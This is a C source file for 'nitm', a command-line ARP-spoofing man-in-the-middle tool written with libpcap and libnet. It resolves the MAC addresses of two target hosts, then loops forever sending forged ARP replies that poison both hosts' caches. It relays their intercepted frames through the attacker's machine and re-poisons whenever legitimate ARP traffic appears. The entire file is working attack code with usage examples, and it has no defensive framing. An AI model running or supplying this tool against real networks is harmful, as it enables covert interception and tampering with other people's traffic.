#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>
#include <netinet/if_ether.h>

//nitm 2
char *device = NULL, *str_ip_t1 = NULL, *str_ip_t2 = NULL;

void print_usage();

void format_mac(struct libnet_ether_addr *mac, char* str_mac){
	sprintf(str_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
			((struct libnet_ether_addr) *mac).ether_addr_octet[0],
			((struct libnet_ether_addr) *mac).ether_addr_octet[1],
			((struct libnet_ether_addr) *mac).ether_addr_octet[2],
			((struct libnet_ether_addr) *mac).ether_addr_octet[3],
			((struct libnet_ether_addr) *mac).ether_addr_octet[4],
			((struct libnet_ether_addr) *mac).ether_addr_octet[5]);
}

void find_mac_packet(u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
	void ** params = (void**) user;
	
	u_int32_t *ip_t = (u_int32_t *) params[0];
	struct libnet_ether_addr *mac_t = (struct libnet_ether_addr *) params[1];
	pcap_t *handle = (pcap_t *) params[2];
	
	struct ether_header *eth_header;
	struct ether_arp *arp_packet;
	
	eth_header = (struct ether_header *) packet;
	
	if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
		arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));
		
		if(ntohs(arp_packet->ea_hdr.ar_op) == 2 && !memcmp (ip_t, arp_packet->arp_spa, 4)){
			memcpy(mac_t, eth_header->ether_shost, 6);
			pcap_breakloop (handle);
		}
	}
}

void find_mac(libnet_t *libnet_ctx, pcap_t *handle, u_int32_t ip_self, struct libnet_ether_addr mac_self, u_int32_t ip_t, struct libnet_ether_addr *mac_t){
	libnet_ptag_t arp = 0, eth = 0;
	u_int8_t mac_broadcast[6];
	
	memset(mac_broadcast, 0xFF, ETHER_ADDR_LEN);
	
	arp = libnet_autobuild_arp(ARPOP_REQUEST, (uint8_t*) &mac_self, (uint8_t*)&ip_self, mac_broadcast, (uint8_t*) &ip_t, libnet_ctx);
	
	if(arp == -1){
		fprintf(stderr, "An error occured while building the ARP header, %s\n", libnet_geterror(libnet_ctx));
		exit(EXIT_FAILURE);
	}
	
	eth = libnet_build_ethernet(mac_broadcast, (uint8_t*) &mac_self, ETHERTYPE_ARP, NULL, 0, libnet_ctx, 0);
	
	if(eth == -1){
		fprintf(stderr, "An error occured while building the Ethernet header. %s\n", libnet_geterror(libnet_ctx));
		exit(EXIT_FAILURE);;
	}
	
	void * params[3] = {&ip_t, mac_t, handle};
	do{
		printf("Writing ARP request\n");
		if(libnet_write(libnet_ctx) == -1){
			printf("An error occured while sending the packet. %s\n", libnet_geterror(libnet_ctx));
			exit(EXIT_FAILURE);;
		}
	}while(pcap_loop(handle, 5, find_mac_packet, (u_char *) params) != -2);
	libnet_clear_packet(libnet_ctx);
}

void spoof_mac(libnet_t *libnet_ctx, u_int32_t ip_t, struct libnet_ether_addr mac_t, u_int32_t ip_spoof, struct libnet_ether_addr mac_self){
	libnet_ptag_t arp = 0, eth = 0;
		
	arp = libnet_autobuild_arp(ARPOP_REPLY, (uint8_t*) &mac_self, (uint8_t*) &ip_spoof, (uint8_t*) &mac_t, (uint8_t*) &ip_t, libnet_ctx);
	
	if(arp == -1){
		fprintf(stderr, "An error occured while building the ARP header, %s\n", libnet_geterror(libnet_ctx));
		exit(EXIT_FAILURE);
	}
	
	eth = libnet_build_ethernet((uint8_t*) &mac_t, (uint8_t*) &mac_self, ETHERTYPE_ARP, NULL, 0, libnet_ctx, 0);
	
	if(eth == -1){
		fprintf(stderr, "An error occured while building the Ethernet header. %s\n", libnet_geterror(libnet_ctx));
		exit(EXIT_FAILURE);;
	}
	
	if((libnet_write(libnet_ctx)) == -1){
		printf("An error occured while sending the packet. %s\n", libnet_geterror(libnet_ctx));
		exit(EXIT_FAILURE);
	}
	
	libnet_clear_packet(libnet_ctx);
}

void handle_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
	void ** params = (void**) user;
	
	pcap_t* pcap_handle = (pcap_t*) params[0];
	u_int32_t *ip_t1 = (u_int32_t *) params[1];
	struct libnet_ether_addr *mac_t1 = (struct libnet_ether_addr *) params[2];
	u_int32_t *ip_t2 = (u_int32_t *) params[3];
	struct libnet_ether_addr *mac_t2 = (struct libnet_ether_addr *) params[4];
	struct libnet_ether_addr *mac_self = (struct libnet_ether_addr *) params[5];
	
	struct ether_header *eth = (struct ether_header *) packet;
	struct ether_arp *arp;
	
	if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
		arp = (struct ether_arp *) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));
		
		if((ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY) && 
				(memcmp(eth->ether_shost, mac_self->ether_addr_octet, 6) != 0) && //not from self
				((memcmp(arp->arp_spa, ip_t1, 4) == 0) || //from t1 or t2
				(memcmp(arp->arp_spa, ip_t2, 4) == 0))){	
			printf("\ntarget sent legit arp reply, spoofing...\n");
			pcap_breakloop (pcap_handle);
		}else if((ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) && 
				(memcmp(eth->ether_shost, mac_self->ether_addr_octet, 6) != 0) &&
				((memcmp(ip_t1, arp->arp_tpa, 4) == 0) ||
				(memcmp(ip_t2, arp->arp_tpa, 4) == 0))) {
			printf("\nSomeone is requesting a targets mac, spoofing...\n");
			pcap_breakloop (pcap_handle);
		}
	}else if(memcmp((*mac_self).ether_addr_octet, eth->ether_dhost, 6) == 0){
		if(memcmp((*mac_t1).ether_addr_octet, eth->ether_shost, 6) == 0){
			memcpy(eth->ether_dhost, mac_t2, 6);
			memcpy(eth->ether_shost, mac_self, 6);
			printf("1");fflush(stdout);
			pcap_sendpacket(pcap_handle, packet, header->len);
		} else if(memcmp((*mac_t2).ether_addr_octet, eth->ether_shost, 6) == 0){
			memcpy(eth->ether_dhost, mac_t1, 6);
			memcpy(eth->ether_shost, mac_self, 6);
			printf("2");fflush(stdout);
			pcap_sendpacket(pcap_handle, packet, header->len);
		}
	}
}

int main(int argc, char **argv){
	
	char errbuf[PCAP_ERRBUF_SIZE];
	
	libnet_t *libnet_ctx;
	
	u_int32_t ip_self, ip_t1, ip_t2;
	struct libnet_ether_addr mac_self, mac_t1, mac_t2;

	pcap_t *pcap_handle;
	struct bpf_program filter;
	
	for(int i = 1; i < argc; i++){
		if(strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--interface") == 0 && i+1 < argc){
			device = argv[i+1];
		}else if(strcmp(argv[i], "-t1") == 0 || strcmp(argv[i], "--targetone") == 0 && i+1 < argc){
			str_ip_t1 = argv[i+1];
		}else if(strcmp(argv[i], "-t2") == 0 || strcmp(argv[i], "--targettwo") == 0 && i+1 < argc){
			str_ip_t2 = argv[i+1];
		}else if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0){
			print_usage();
			return EXIT_SUCCESS;
		}
	}
		
	if(device == NULL && (device = pcap_lookupdev(errbuf)) == NULL){
		fprintf(stderr, "Device error: %s\n", errbuf);
		return EXIT_FAILURE;
	}
	
	if(str_ip_t1 == NULL || str_ip_t2 == NULL){
		fprintf(stderr, "Target/s not set.\n");
		return EXIT_FAILURE;
	}
	
	if((libnet_ctx = libnet_init(LIBNET_LINK, device, errbuf)) == NULL){
		fprintf(stderr, "Libnet init error: %s\n", errbuf);
		return EXIT_FAILURE;
	}
	
	if((pcap_handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf)) == NULL){
		fprintf(stderr, "Couldn't open device %s: %s\n", device, errbuf);
		libnet_destroy(libnet_ctx);
		return EXIT_FAILURE;
	}
	
	if(pcap_datalink(pcap_handle) != DLT_EN10MB){
		fprintf(stderr, "%s is not an Ethernet device.\n", device);
		pcap_close(pcap_handle);
		libnet_destroy(libnet_ctx);
		return EXIT_FAILURE;
	}
	
	pcap_compile(pcap_handle, &filter, "arp", 1, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(pcap_handle, &filter);

	ip_self = libnet_get_ipaddr4(libnet_ctx);
	ip_t1 = libnet_name2addr4(libnet_ctx, str_ip_t1, LIBNET_RESOLVE);
	ip_t2 = libnet_name2addr4(libnet_ctx, str_ip_t2, LIBNET_RESOLVE);
	
	mac_self = *libnet_get_hwaddr(libnet_ctx);
	
	char buf[18] = {0};
	
	printf("Asking for mac of %s:\n", str_ip_t1);
	find_mac(libnet_ctx, pcap_handle, ip_self, mac_self, ip_t1, &mac_t1);
	format_mac(&mac_t1, buf);
	printf("%s\n", buf);
					
	printf("Asking for mac of %s:\n", str_ip_t2);
	find_mac(libnet_ctx, pcap_handle, ip_self, mac_self, ip_t2, &mac_t2);
	format_mac(&mac_t2, buf);
	printf("%s\n", buf);
	
	//remove filter
	pcap_compile(pcap_handle, &filter, "", 1, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(pcap_handle, &filter);
	
	void * params[6] = {pcap_handle, &ip_t1, &mac_t1, &ip_t2, &mac_t2, &mac_self};
	
	for(;;){
		spoof_mac(libnet_ctx, ip_t1, mac_t1, ip_t2, mac_self);
		spoof_mac(libnet_ctx, ip_t2, mac_t2, ip_t1, mac_self);
		pcap_loop(pcap_handle, -1, handle_packet, (u_char *) params);
	}
	
	pcap_close(pcap_handle);
	libnet_destroy(libnet_ctx);
	return EXIT_SUCCESS;
}

void print_usage(){
	printf("nitm v0.2 by frequem\n");
	printf("Usage: nitm -i <interface> -t1 <target_one_ip> -t2 <target_two_ip>\n");
	printf("or nitm -t1 <target_one_ip> -t2 <target_two_ip>\n");
	printf("e.g. nitm -i eth0 -t1 192.168.0.1 -t2 192.168.0.6\n");
}
